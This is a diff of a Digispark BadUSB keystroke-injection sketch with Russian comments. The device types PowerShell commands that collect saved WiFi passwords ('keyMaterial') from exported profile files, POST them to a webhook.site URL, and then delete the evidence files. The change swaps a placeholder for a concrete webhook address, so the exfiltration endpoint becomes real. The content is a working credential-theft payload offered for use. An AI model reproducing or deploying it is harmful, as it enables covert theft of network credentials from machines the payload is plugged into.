@@ -19,7 +19,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path *.xml -Pattern 'keyMaterial' > wifi_pass"); //выделить все файл xml и экспортировать в wifi_pass
   DigiKeyboard.delay(500);  
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<Your unique URL> -Method POST -InFile wifi_pass"); //Отправка на веб хук паролей вай фай
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/3ef798f5-b700-418c-be26-dc643450b4b2 -Method POST -InFile wifi_pass"); //Отправка на веб хук паролей вай фай
   DigiKeyboard.delay(1000);  
   DigiKeyboard.println("del wifi_* /s /f /q");
   DigiKeyboard.delay(500);  
